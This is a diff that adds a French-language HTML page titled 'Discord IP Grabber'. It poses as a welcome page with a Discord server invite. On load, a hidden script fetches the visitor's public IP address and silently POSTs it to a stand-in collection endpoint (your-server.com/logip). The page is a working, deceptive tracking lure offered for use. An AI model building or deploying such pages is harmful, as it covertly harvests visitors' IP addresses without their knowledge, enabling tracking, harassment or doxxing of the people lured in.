@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord IP Grabber</title>
+</head>
+<body>
+    <h1>Bienvenue sur notre serveur Discord !</h1>
+    <p>Cliquez sur le lien ci-dessous pour rejoindre notre serveur spécial :</p>
+    <a href="https://discord.gg/aVdyGmJW" target="_blank">Rejoindre le serveur</a>
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('Your IP address is:', data.ip);
+                fetch('https://your-server.com/logip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ ip: data.ip })
+                });
+            });
+    </script>
+</body>
+</html>
+
